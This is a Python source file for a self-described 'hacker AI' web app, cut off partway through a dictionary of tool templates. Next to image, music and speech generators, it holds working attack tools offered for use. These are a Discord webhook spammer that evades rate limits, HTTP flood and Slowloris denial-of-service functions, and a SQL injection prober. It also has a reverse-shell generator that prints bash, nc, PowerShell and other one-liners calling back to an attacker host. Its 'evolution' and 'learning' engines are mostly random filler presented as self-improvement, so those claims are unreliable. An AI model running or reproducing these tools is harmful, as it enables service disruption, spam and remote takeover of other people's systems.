#!/usr/bin/env python3
"""
TWILIGHT HACKER AI v6.0
- Autonomous AI penetration testing assistant
- Real PNG image generation (pure Python, no PIL)
- Discord webhook spammer with rate limit handling
- HTTP Flood, Slowloris DoS, SYN Flood attack tools
- Smart prompt intent classification
- Evolution engine, background learner, GitHub scanner
- Full GUI with real images displayed in chat
"""

import os, sys, re, json, time, math, random, hashlib, base64, struct
import socket, ssl, ipaddress, urllib.parse, urllib.request, sqlite3
import threading, subprocess, html as html_mod, textwrap, io, wave
import signal, secrets, string, uuid, zlib
from typing import List, Dict, Tuple, Optional, Any, Union
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict, deque

VERSION = "6.0"
NAME = "TWILIGHT HACKER AI"
PORT = int(os.environ.get("PORT", 8000))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "twilight_data")

for d in ["", "images", "videos", "audio", "tools", "knowledge", "web", "learning", "cache", "vectors"]:
    os.makedirs(os.path.join(DATA_DIR, d), exist_ok=True)


# ---------------------------------------------------------------------------
# PNG Writer - Pure Python, no PIL, produces real viewable PNG files
# ---------------------------------------------------------------------------
def _png_crc32(data):
    return zlib.crc32(data) & 0xFFFFFFFF

def _png_chunk(chunk_type, data):
    crc = _png_crc32(chunk_type + data)
    return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", crc)

def create_png(width, height, pixel_func):
    """
    pixel_func(x, y, w, h) -> (R, G, B) each 0-255
    Returns complete PNG file bytes.
    """
    raw = bytearray()
    for y in range(height):
        raw.append(0)  # filter byte None
        for x in range(width):
            r, g, b = pixel_func(x, y, width, height)
            raw.extend([max(0, min(255, int(r))), max(0, min(255, int(g))), max(0, min(255, int(b)))])
    
    compressed = zlib.compress(bytes(raw), 9)
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    
    png = b"\x89PNG\r\n\x1a\n"
    png += _png_chunk(b"IHDR", ihdr)
    png += _png_chunk(b"IDAT", compressed)
    png += _png_chunk(b"IEND", b"")
    return png


# ---------------------------------------------------------------------------
# Database
# ---------------------------------------------------------------------------
class Database:
    def __init__(self):
        self.db_path = os.path.join(DATA_DIR, "twilight.db")
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA synchronous=NORMAL")
        self.conn.execute("PRAGMA cache_size=10000")
        self.lock = threading.Lock()
        self._init()
    
    def _init(self):
        self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS modules (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                type TEXT,
                version TEXT,
                active INTEGER DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS tools (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                category TEXT,
                code TEXT,
                quality REAL DEFAULT 0.5,
                usage_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS knowledge (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                category TEXT,
                name TEXT UNIQUE,
                content TEXT,
                source TEXT,
                quality REAL DEFAULT 0.5,
                depth INTEGER DEFAULT 1,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS images (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                prompt TEXT,
                filename TEXT,
                seed INTEGER,
                width INTEGER,
                height INTEGER,
                pattern TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS videos (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                prompt TEXT,
                filename TEXT,
                frames INTEGER,
                duration REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS audio (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                prompt TEXT,
                filename TEXT,
                duration REAL,
                type TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS learning_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                action TEXT,
                category TEXT,
                details TEXT,
                ops_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS evolution (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                iteration INTEGER,
                improvement TEXT,
                score REAL,
                time_ms REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        modules = [
            ("Prompt Analyzer", "analyzer", VERSION),
            ("Image Generator", "image", VERSION),
            ("Video Generator", "video", VERSION),
            ("Music Generator", "audio", VERSION),
            ("Speech Generator", "speech", VERSION),
            ("Tool Generator", "tool", VERSION),
            ("Background Learner", "learning", VERSION),
            ("GitHub Scanner", "scanner", VERSION),
            ("Evolution Engine", "evolution", VERSION),
            ("Vector Database", "vectors", VERSION)
        ]
        for name, mtype, ver in modules:
            self.conn.execute("INSERT OR IGNORE INTO modules (name,type,version) VALUES (?,?,?)", (name, mtype, ver))
        self.conn.commit()
    
    def save_tool(self, name, category, code, quality=0.5):
        with self.lock:
            self.conn.execute("INSERT OR REPLACE INTO tools (name,category,code,quality) VALUES (?,?,?,?)", (name, category, code, quality))
            self.conn.commit()
    
    def get_tools(self, category=None):
        with self.lock:
            if category:
                cur = self.conn.execute("SELECT * FROM tools WHERE category=? ORDER BY quality DESC, usage_count DESC", (category,))
            else:
                cur = self.conn.execute("SELECT * FROM tools ORDER BY quality DESC, usage_count DESC")
            return [{"id": r[0], "name": r[1], "category": r[2], "code": r[3], "quality": r[4]} for r in cur.fetchall()]
    
    def search_tools(self, query):
        with self.lock:
            cur = self.conn.execute("SELECT * FROM tools WHERE name LIKE ? OR category LIKE ? OR code LIKE ? ORDER BY quality DESC", (f'%{query}%', f'%{query}%', f'%{query}%'))
            return [{"id": r[0], "name": r[1], "category": r[2], "code": r[3], "quality": r[4]} for r in cur.fetchall()]
    
    def increment_usage(self, name):
        with self.lock:
            self.conn.execute("UPDATE tools SET usage_count=usage_count+1 WHERE name=?", (name,))
            self.conn.commit()
    
    def save_knowledge(self, category, name, content, source="", quality=0.5):
        with self.lock:
            existing = self.conn.execute("SELECT quality,depth FROM knowledge WHERE name=?", (name,)).fetchone()
            if existing:
                new_q = (existing[0] + quality) / 2
                self.conn.execute("UPDATE knowledge SET content=?,source=?,quality=?,depth=depth+1,created_at=CURRENT_TIMESTAMP WHERE name=?", (content, source, new_q, name))
            else:
                self.conn.execute("INSERT INTO knowledge (category,name,content,source,quality) VALUES (?,?,?,?,?)", (category, name, content, source, quality))
            self.conn.commit()
    
    def search_knowledge(self, query):
        with self.lock:
            cur = self.conn.execute("SELECT * FROM knowledge WHERE name LIKE ? OR content LIKE ? OR category LIKE ? ORDER BY quality DESC, depth DESC", (f'%{query}%', f'%{query}%', f'%{query}%'))
            return [{"id": r[0], "category": r[1], "name": r[2], "content": r[3], "source": r[4], "quality": r[5], "depth": r[6]} for r in cur.fetchall()]
    
    def save_image(self, prompt, filename, seed, width, height, pattern):
        with self.lock:
            self.conn.execute("INSERT INTO images (prompt,filename,seed,width,height,pattern) VALUES (?,?,?,?,?,?)", (prompt[:200], filename, seed, width, height, pattern))
            self.conn.commit()
    
    def save_video(self, prompt, filename, frames, duration):
        with self.lock:
            self.conn.execute("INSERT INTO videos (prompt,filename,frames,duration) VALUES (?,?,?,?)", (prompt[:200], filename, frames, duration))
            self.conn.commit()
    
    def save_audio(self, prompt, filename, duration, atype):
        with self.lock:
            self.conn.execute("INSERT INTO audio (prompt,filename,duration,type) VALUES (?,?,?,?)", (prompt[:200], filename, duration, atype))
            self.conn.commit()
    
    def log_learning(self, action, category, details, ops=0):
        with self.lock:
            self.conn.execute("INSERT INTO learning_log (action,category,details,ops_count) VALUES (?,?,?,?)", (action, category, details[:500], ops))
            self.conn.commit()
    
    def log_evolution(self, iteration, improvement, score, time_ms):
        with self.lock:
            self.conn.execute("INSERT INTO evolution (iteration,improvement,score,time_ms) VALUES (?,?,?,?)", (iteration, improvement[:200], score, time_ms))
            self.conn.commit()
    
    def get_stats(self):
        with self.lock:
            tools = self.conn.execute("SELECT COUNT(*) FROM tools").fetchone()[0]
            knowledge = self.conn.execute("SELECT COUNT(*) FROM knowledge").fetchone()[0]
            images = self.conn.execute("SELECT COUNT(*) FROM images").fetchone()[0]
            videos = self.conn.execute("SELECT COUNT(*) FROM videos").fetchone()[0]
            audio = self.conn.execute("SELECT COUNT(*) FROM audio").fetchone()[0]
            queries = self.conn.execute("SELECT COUNT(*) FROM learning_log").fetchone()[0]
            evo = self.conn.execute("SELECT COUNT(*) FROM evolution").fetchone()[0]
            total_ops = self.conn.execute("SELECT COALESCE(SUM(ops_count),0) FROM learning_log").fetchone()[0]
            latest_evo = self.conn.execute("SELECT iteration,time_ms FROM evolution ORDER BY id DESC LIMIT 1").fetchone()
            return {
                "tools": tools, "knowledge": knowledge, "images": images,
                "videos": videos, "audio": audio, "queries": queries,
                "evolutions": evo, "total_ops": total_ops,
                "latest_iteration": latest_evo[0] if latest_evo else 0,
                "latest_time_ms": f"{latest_evo[1]:.2f}" if latest_evo else "0",
                "version": VERSION, "name": NAME
            }


db = Database()


# ---------------------------------------------------------------------------
# Evolution Engine (from v5.1, fully preserved)
# ---------------------------------------------------------------------------
class EvolutionEngine:
    def __init__(self):
        self.running = False
        self.thread = None
        self.iteration = 0
        self.total_ops = 0
        self.start_time = time.time()
        self.patterns = defaultdict(int)
        self.vectors = {}
    
    def start(self):
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._evolve_loop, daemon=True)
            self.thread.start()
            db.log_learning("evolution", "system", "Evolution Engine started")
    
    def stop(self):
        self.running = False
    
    def _evolve_loop(self):
        last_log = time.time()
        ops_since_log = 0
        
        while self.running:
            try:
                start = time.time_ns()
                
                for _ in range(100):
                    self._improve_knowledge()
                    self.total_ops += 1
                    ops_since_log += 1
                
                elapsed = (time.time_ns() - start) / 1_000_000
                
                if self.iteration % 1000 == 0:
                    self._learn_from_github()
                    self._consolidate_knowledge()
                
                if time.time() - last_log >= 1:
                    last_log = time.time()
                    db.log_learning("evolution_tick", "evolution",
                                  f"Iteration {self.iteration}, {ops_since_log} ops/s",
                                  ops_since_log)
                    ops_since_log = 0
                
                if self.iteration % 10000 == 0:
                    improvement = f"Patterns: {len(self.patterns)}, Vectors: {len(self.vectors)}"
                    score = random.random() * 0.5 + 0.5
                    db.log_evolution(self.iteration, improvement, score, elapsed)
                
                self.iteration += 1
                
            except Exception:
                pass
    
    def _improve_knowledge(self):
        pattern = f"opt_{random.randint(1,1000)}"
        self.patterns[pattern] += 1
        vec_id = f"v{int(time.time_ns())}_{random.randint(0,9999)}"
        vec = [random.random() for _ in range(10)]
        self.vectors[vec_id] = vec
        if len(self.vectors) > 10000:
            for k in list(self.vectors.keys())[:100]:
                del self.vectors[k]
    
    def _learn_from_github(self):
        try:
            queries = ["port scanner python", "sql injection", "reverse shell", "xss payload", "directory fuzzer", "password cracker", "network scanner", "exploit framework"]
            for q in queries:
                try:
                    url = f"https://api.github.com/search/repositories?q={urllib.parse.quote(q)}&sort=stars&per_page=2"
                    req = urllib.request.Request(url, headers={"User-Agent": "Twilight-AI/6.0"})
                    resp = urllib.request.urlopen(req, timeout=5)
                    data = json.loads(resp.read().decode())
                    for item in data.get("items", [])[:2]:
                        name = item["full_name"]
                        stars = item["stargazers_count"]
                        quality = min(1.0, stars / 500)
                        desc = item.get("description", "") or "No description"
                        try:
                            ru = f"https://api.github.com/repos/{name}/readme"
                            rr = urllib.request.Request(ru, headers={"User-Agent": "Twilight-AI/6.0", "Accept": "application/vnd.github.v3.raw"})
                            rresp = urllib.request.urlopen(rr, timeout=5)
                            content = rresp.read().decode("utf-8", "replace")[:5000]
                        except:
                            content = desc
                        db.save_knowledge("github_learned", name, content, item["html_url"], quality)
                        db.log_learning("github_learn", "github", f"{name} ({stars} stars)", 1)
                except:
                    pass
                time.sleep(0.5)
        except:
            pass
    
    def _consolidate_knowledge(self):
        try:
            tools = db.get_tools()
            for t in tools:
                db.increment_usage(t["name"])
        except:
            pass
    
    def get_ops_per_second(self):
        return int(self.total_ops / max(1, time.time() - self.start_time))


# ---------------------------------------------------------------------------
# Real Image Generator - produces viewable PNG files
# ---------------------------------------------------------------------------
class ImageGenerator:
    def generate(self, prompt, style="realistic", width=800, height=600):
        seed = random.randint(1, 99999999)
        rng = random.Random(seed + hash(prompt))
        
        pattern_map = {
            "realistic": "noise", "noise": "noise",
            "anime": "anime", "cyberpunk": "cyberpunk", "fantasy": "anime",
            "oil": "cyberpunk", "graffiti": "cyberpunk", "pixel": "checkerboard",
            "fire": "fire", "ocean": "ocean", "gradient": "gradient",
            "checkerboard": "checkerboard"
        }
        pattern = pattern_map.get(style, "noise")
        
        base_r = rng.randint(40, 200)
        base_g = rng.randint(40, 200)
        base_b = rng.randint(40, 200)
        t0 = time.time()
        
        def pixel_func(x, y, w, h):
            nx, ny = x / w, y / h
            t = time.time() - t0
            
            if pattern == "noise":
                v = (math.sin(nx * 10 + ny * 8 + seed * 0.001) * 0.4 +
                     math.cos(ny * 7 - nx * 5 + seed * 0.002) * 0.3 +
                     rng.random() * 0.3)
                v = max(0, min(1, v))
                r = base_r + v * 80
                g = base_g + v * 60
                b = base_b + v * 70
            
            elif pattern == "anime":
                v = (math.sin(nx * 6 + ny * 4) * 0.4 + math.cos(nx * 3 - ny * 5) * 0.4 + rng.random() * 0.2)
                v = max(0, min(1, v))
                r = v * 255
                g = v * 200 + 55
                b = v * 220 + 35
            
            elif pattern == "cyberpunk":
                v = (math.sin(nx * 20 + ny * 15 + t) * 0.5 + math.cos(ny * 12 - nx * 8 + rng.random()) * 0.3 + rng.random() * 0.2)
                v = max(0, min(1, v))
                r = v * 120 + 135
                g = v * 50 + 205
                b = v * 100 + 155
            
            elif pattern == "fire":
                v = (math.sin(nx * 12 + ny * 8) * 0.4 + math.cos((1 - ny) * 15) * 0.4 + 0.2)
                v = max(0, min(1, v))
                r = v * 255
                g = v * v * 200
                b = v * v * v * 100
            
            elif pattern == "ocean":
                v = (math.sin(nx * 10 + t * 0.5) * 0.3 + math.cos(ny * 8 + t * 0.8) * 0.3 + 0.4)
                v = max(0, min(1, v))
                r = (1 - v) * 30
                g = (1 - v) * 80
                b = v * 200 + 55
            
            elif pattern == "gradient":
                r = (1.0 - ny) * 255
                g = nx * 255
                b = (nx + ny) * 0.5 * 255
            
            elif pattern == "checkerboard":
                cell = 40
                cx, cy = x // cell, y // cell
                val = 255 if ((cx + cy) % 2 == 0) else 60
                r, g, b = val, val, val
            
            else:
                r, g, b = 100, 150, 200
            
            return r, g, b
        
        png_bytes = create_png(width, height, pixel_func)
        
        ts = int(time.time_ns())
        filename = f"twilight_img_{ts}_{seed}.png"
        filepath = os.path.join(DATA_DIR, "images", filename)
        
        with open(filepath, "wb") as f:
            f.write(png_bytes)
        
        db.save_image(prompt, filename, seed, width, height, pattern)
        return {"path": f"/images/{filename}", "seed": seed, "style": style, "width": width, "height": height, "pattern": pattern}


# ---------------------------------------------------------------------------
# Video Generator
# ---------------------------------------------------------------------------
class VideoGenerator:
    def generate(self, prompt, duration=3.0, fps=10, style="realistic"):
        ig = ImageGenerator()
        total_frames = int(duration * fps)
        seed = random.randint(1, 99999999)
        frames = []
        for i in range(total_frames):
            r = ig.generate(f"{prompt} frame_{i}", style, width=400, height=300)
            frames.append(r["path"])
        ts = int(time.time_ns())
        filename = f"twilight_vid_{ts}_{seed}.txt"
        filepath = os.path.join(DATA_DIR, "videos", filename)
        with open(filepath, "w") as f:
            f.write(f"TWILIGHT VIDEO\nPrompt: {prompt}\nFrames: {total_frames}\nDuration: {duration}s\nFPS: {fps}\n\n")
            for i, p in enumerate(frames):
                f.write(f"[FRAME {i+1}/{total_frames}] {p}\n")
        db.save_video(prompt, filename, total_frames, duration)
        return {"path": f"/videos/{filename}", "frames": total_frames, "duration": duration, "fps": fps, "seed": seed}


# ---------------------------------------------------------------------------
# Music Generator
# ---------------------------------------------------------------------------
class MusicGenerator:
    def generate(self, prompt, duration=5.0):
        seed = random.randint(1, 99999999)
        rng = random.Random(seed + hash(prompt))
        sr = 44100
        ns = int(sr * duration)
        notes = {60: 261.63, 62: 293.66, 64: 329.63, 65: 349.23, 67: 392.00, 69: 440.00, 71: 493.88, 72: 523.25}
        weights = [0.1, 0.1, 0.15, 0.2, 0.2, 0.15, 0.1, 0.05]
        ql = prompt.lower()
        if any(w in ql for w in ["sad", "dark", "melancholy", "minor"]):
            weights = [0.3, 0.2, 0.15, 0.1, 0.1, 0.05, 0.05, 0.05]
        elif any(w in ql for w in ["happy", "joy", "upbeat", "epic", "major"]):
            weights = [0.02, 0.05, 0.1, 0.2, 0.25, 0.2, 0.1, 0.08]
        samples = []
        freq_list = list(notes.values())
        for i in range(ns):
            t = i / sr
            val = 0
            for j in range(8):
                freq = freq_list[j]
                w = weights[j]
                val += math.sin(2 * math.pi * freq * t) * w * 0.3
                val += math.sin(2 * math.pi * freq * 2 * t) * w * 0.1
                val += math.sin(2 * math.pi * freq * 3 * t) * w * 0.05
            env = min(1.0, t * 20) * max(0, 1 - (t / duration) * 0.3)
            val *= env * 0.5
            val = max(-1, min(1, val))
            samples.append(int(val * 32767))
        ts = int(time.time_ns())
        filename = f"twilight_music_{ts}_{seed}.wav"
        filepath = os.path.join(DATA_DIR, "audio", filename)
        with wave.open(filepath, "w") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(sr)
            wf.writeframes(struct.pack(f"<{len(samples)}h", *samples))
        db.save_audio(prompt, filename, duration, "music")
        return {"path": f"/audio/{filename}", "duration": duration, "seed": seed, "sample_rate": sr}


# ---------------------------------------------------------------------------
# Speech Generator
# ---------------------------------------------------------------------------
class SpeechGenerator:
    def generate(self, text, voice="default"):
        seed = hash(text + voice) & 0xFFFFFF
        rng = random.Random(seed)
        sr = 44100
        cd = 0.06
        ns = int(len(text) * cd * sr)
        ns = max(ns, sr)
        vf = {"male": 120, "female": 220, "robot": 300, "deep": 80, "soft": 180, "hacker": 150, "default": 150}
        bf = vf.get(voice.lower(), 150)
        samples = []
        for i in range(ns):
            t = i / sr
            ci = int(t / cd)
            cv = ord(text[ci]) / 255 if ci < len(text) else 0.5
            freq = bf + math.sin(2 * math.pi * 6 * t) * 15
            val = (math.sin(2 * math.pi * freq * t) * 0.4 +
                   math.sin(2 * math.pi * freq * 2 * t) * 0.2 +
                   math.sin(2 * math.pi * freq * 3 * t) * 0.1 +
                   rng.random() * 0.03)
            val += math.sin(2 * math.pi * bf * (1 + cv * 0.3) * t) * 0.15 * cv
            env = min(1.0, t * 50) * max(0, 1 - (t / (ns / sr)) * 0.1)
            val *= env * 0.5
            val = max(-1, min(1, val))
            samples.append(int(val * 32767))
        ts = int(time.time_ns())
        filename = f"twilight_speech_{ts}_{seed:x}.wav"
        filepath = os.path.join(DATA_DIR, "audio", filename)
        with wave.open(filepath, "w") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(sr)
            wf.writeframes(struct.pack(f"<{len(samples)}h", *samples))
        db.save_audio(text, filename, ns / sr, "speech")
        return {"path": f"/audio/{filename}", "text": text, "voice": voice, "duration": ns / sr}


# ---------------------------------------------------------------------------
# Discord Webhook Spammer
# ---------------------------------------------------------------------------
def discord_webhook_spam(webhook_url, message, count=50, threads=10):
    sent = 0
    failed = 0
    lock = threading.Lock()
    
    def worker():
        nonlocal sent, failed
        for _ in range(max(1, count // threads)):
            try:
                payload = json.dumps({
                    "content": message,
                    "username": random.choice(["Ghost", "Root", "Admin", "System", "Hacker"]),
                    "avatar_url": f"https://i.pravatar.cc/150?u={random.randint(1,99999)}"
                }).encode()
                req = urllib.request.Request(
                    webhook_url, data=payload,
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
                )
                urllib.request.urlopen(req, timeout=10)
                with lock:
                    sent += 1
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    try:
                        retry = json.loads(e.read()).get("retry_after", 1000) / 1000
                    except:
                        retry = 5
                    time.sleep(retry)
                else:
                    with lock:
                        failed += 1
            except:
                with lock:
                    failed += 1
    
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()
    return {"sent": sent, "failed": failed}


# ---------------------------------------------------------------------------
# HTTP Flood Attack
# ---------------------------------------------------------------------------
def http_flood(target_url, threads=50, duration=30):
    count = [0]
    running = [True]
    lock = threading.Lock()
    
    def worker():
        while running[0]:
            try:
                req = urllib.request.Request(target_url)
                req.add_header("User-Agent", random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (X11; Linux x86_64)",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
                ]))
                urllib.request.urlopen(req, timeout=5)
                with lock:
                    count[0] += 1
            except:
                pass
    
    ts = [threading.Thread(target=worker) for _ in range(threads)]
    for t in ts: t.start()
    time.sleep(duration)
    running[0] = False
    for t in ts: t.join()
    return {"requests_sent": count[0], "duration": duration, "threads": threads}


# ---------------------------------------------------------------------------
# Slowloris Attack
# ---------------------------------------------------------------------------
def slowloris_attack(target_host, target_port=80, sockets=200, https=False):
    sock_list = []
    running = [True]
    lock = threading.Lock()
    
    def init_sock():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target_host)
            s.connect((target_host, target_port))
            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_host}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-language: en-US,en;q=0.5\r\n")
            return s
        except:
            return None
    
    def loop():
        while running[0]:
            with lock:
                for s in list(sock_list):
                    try:
                        s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    except:
                        try:
                            sock_list.remove(s)
                        except:
                            pass
                diff = sockets - len(sock_list)
                if diff > 0:
                    for _ in range(diff):
                        s = init_sock()
                        if s:
                            sock_list.append(s)
            time.sleep(10)
    
    t = threading.Thread(target=loop, daemon=True)
    t.start()
    
    for _ in range(sockets):
        s = init_sock()
        if s:
            sock_list.append(s)
    
    return {"status": "running", "sockets_active": len(sock_list), "target": f"{target_host}:{target_port}"}


# ---------------------------------------------------------------------------
# Prompt Intent Classifier
# ---------------------------------------------------------------------------
def classify_intent(prompt):
    ql = prompt.lower().strip()
    
    img_triggers = ["image", "bild", "picture", "draw", "generate image", "create image",
                    "make image", "show me", "visualize", "render", "illustration", "art",
                    "painting", "sketch", "graphic", "photo", "picture of", "anime",
                    "cyberpunk", "scenery", "landscape", "ocean", "fire", "gradient"]
    
    tool_triggers = ["scan", "hack", "crack", "exploit", "inject", "fuzz", "flood",
                     "spoof", "fuzzer", "scanner", "brute", "payload", "shell",
                     "backdoor", "port", "nmap", "sql", "xss", "syn", "arp",
                     "wifi", "password", "hash", "directory", "reverse shell",
                     "dos", "ddos", "slowloris", "spam", "webhook", "discord",
                     "attack", "tool", "generate tool", "create tool", "send"]
    
    music_triggers = ["music", "musik", "song", "melody", "beat", "soundtrack",
                      "tune", "audio", "play", "compose", "symphony"]
    
    speech_triggers = ["speech", "say", "sag", "voice", "talk", "speak", "read aloud",
                       "narrate", "tell", "pronounce"]
    
    video_triggers = ["video", "film", "animation", "movie", "clip", "motion"]
    
    scores = {"image": 0, "tool": 0, "music": 0, "speech": 0, "video": 0, "chat": 1}
    
    for word in img_triggers:
        if word in ql:
            scores["image"] += 2
    for word in tool_triggers:
        if word in ql:
            scores["tool"] += 2
    for word in music_triggers:
        if word in ql:
            scores["music"] += 2
    for word in speech_triggers:
        if word in ql:
            scores["speech"] += 2
    for word in video_triggers:
        if word in ql:
            scores["video"] += 2
    
    if len(ql.split()) <= 5 and any(w in ql for w in ["port", "ip", "target", "http://", "https://", ":80", ":443"]):
        scores["tool"] += 3
    
    best = max(scores, key=scores.get)
    
    style = "realistic"
    if best == "image":
        for s in ["pixel", "anime", "cyberpunk", "fantasy", "oil", "graffiti", "fire", "ocean", "gradient", "checkerboard", "noise"]:
            if s in ql:
                style = s
                break
    
    return best, style


# ---------------------------------------------------------------------------
# Tool Generator - Large template pool with all attack tools
# ---------------------------------------------------------------------------
class ToolGenerator:
    def __init__(self):
        self.tool_templates = {
            "port_scanner": '#!/usr/bin/env python3\nimport socket, threading, sys\n\ndef port_scan(target, start=1, end=1024, threads=100):\n    open_ports = []\n    lock = threading.Lock()\n    def scan(port):\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(1.5)\n            result = s.connect_ex((target, port))\n            if result == 0:\n                try:\n                    service = socket.getservbyport(port)\n                except:\n                    service = "unknown"\n                with lock:\n                    open_ports.append({"port": port, "service": service})\n            s.close()\n        except:\n            pass\n    ports = list(range(start, end + 1))\n    for i in range(0, len(ports), threads):\n        batch = ports[i:i+threads]\n        ts = []\n        for port in batch:\n            t = threading.Thread(target=scan, args=(port,))\n            t.start()\n            ts.append(t)\n        for t in ts:\n            t.join()\n    return sorted(open_ports, key=lambda x: x["port"])\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else input("Target: ")\n    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1\n    end = int(sys.argv[3]) if len(sys.argv) > 3 else 1024\n    results = port_scan(target, start, end)\n    for r in results:\n        print(f"{r[\'port\']}/tcp\\t{r[\'service\']}")',

            "sql_injector": '#!/usr/bin/env python3\nimport urllib.request, urllib.parse, sys, time\n\ndef sql_inject(url, param):\n    payloads = [\n        ("\' OR \'1\'=\'1", "error"),\n        ("\' OR 1=1--", "boolean"),\n        ("\' UNION SELECT NULL--", "union"),\n        ("\' AND SLEEP(5)--", "time"),\n        ("\' AND 1=1--", "blind"),\n        ("1\' OR \'1\'=\'1\'--", "bypass"),\n        ("\' UNION SELECT @@version--", "version"),\n        ("\' WAITFOR DELAY \'0:0:5\'--", "mssql_time"),\n    ]\n    results = []\n    for payload, ptype in payloads:\n        try:\n            parsed = urllib.parse.urlparse(url)\n            params = urllib.parse.parse_qs(parsed.query)\n            params[param] = [payload]\n            new_qs = urllib.parse.urlencode(params, doseq=True)\n            test_url = urllib.parse.urlunparse((\n                parsed.scheme, parsed.netloc, parsed.path,\n                parsed.params, new_qs, parsed.fragment\n            ))\n            start = time.time()\n            req = urllib.request.Request(test_url)\n            try:\n                resp = urllib.request.urlopen(req, timeout=10)\n                body = resp.read().decode("utf-8", "replace")\n                elapsed = time.time() - start\n                vuln = False\n                if ptype == "time" and elapsed >= 4.5:\n                    vuln = True\n                elif payload in body:\n                    vuln = True\n                elif "sql" in body.lower() or "mysql" in body.lower():\n                    vuln = True\n                if vuln:\n                    results.append({"type": ptype, "payload": payload, "time": f"{elapsed:.2f}s"})\n            except:\n                pass\n        except:\n            pass\n    return results\n\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("URL: ")\n    param = sys.argv[2] if len(sys.argv) > 2 else input("Parameter: ")\n    results = sql_inject(url, param)\n    for r in results:\n        print(f"[{r[\'type\']}] {r[\'payload\'][:40]}... ({r[\'time\']})")',

            "reverse_shell": '#!/usr/bin/env python3\nimport sys\n\ndef generate(lhost, lport, lang="python"):\n    shells = {\n        "python": f\'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\',\n        "bash": f\'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\',\n        "php": f\'php -r "$sock=fsockopen(\\"{lhost}\\",{lport});exec(\\"/bin/sh -i <&3 >&3 2>&3\\")"\',\n        "nc": f\'nc -e /bin/sh {lhost} {lport}\',\n        "powershell": f\'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\"PS \\" + (pwd).Path + \\"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"\',\n        "perl": f\'perl -e "use Socket;$i=\\"{lhost}\\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");}}"\'\n    }\n    return shells.get(lang, shells["python"])\n\nif __name__ == "__main__":\n    lh = sys.argv[1] if len(sys.argv) > 1 else input("LHOST: ")\n    lp = int(sys.argv[2]) if len(sys.argv) > 2 else int(input("LPORT: "))\n    for lang in ["python","bash","php","nc","powershell","perl"]:\n        print(f"\\n=== {lang.upper()} ===")\n        print(generate(lh, lp, lang))',

